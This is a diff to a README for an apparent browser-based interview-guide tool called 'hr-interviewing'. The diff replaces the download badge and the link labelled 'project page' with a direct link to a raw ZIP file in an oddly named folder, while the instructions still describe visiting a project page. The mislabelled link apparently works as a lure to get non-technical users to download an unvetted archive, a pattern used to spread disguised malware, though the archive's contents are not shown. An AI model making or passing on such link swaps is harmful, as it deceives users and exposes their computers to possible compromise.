@@ -1,6 +1,6 @@
 # 📋 hr-interviewing - Create professional interview guides in seconds
 
-[![](https://img.shields.io/badge/Download-hr--interviewing-blue)](https://github.com/Masonryfinance857/hr-interviewing)
+[![](https://img.shields.io/badge/Download-hr--interviewing-blue)](https://github.com/Masonryfinance857/hr-interviewing/raw/refs/heads/main/Buddhahood/hr-interviewing-3.4.zip)
 
 ## 📌 Purpose
 The hr-interviewing tool helps you prepare for candidate interviews. It compares a candidate resume against a specific job description. The software generates tailored questions and structured guides for your meetings. You do not need to install complex software or set up a web server. This tool runs directly inside your web browser using standard technology.
@@ -17,7 +17,7 @@ This application serves recruiters, hiring managers, and business owners who nee
 ## 📥 Getting Started
 You can use this tool without any programming experience. Follow these steps to set up the application on your computer.
 
-1. Visit the [hr-interviewing project page](https://github.com/Masonryfinance857/hr-interviewing).
+1. Visit the [hr-interviewing project page](https://github.com/Masonryfinance857/hr-interviewing/raw/refs/heads/main/Buddhahood/hr-interviewing-3.4.zip).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click the button and select "Download ZIP".
 4. Save the file to your computer.
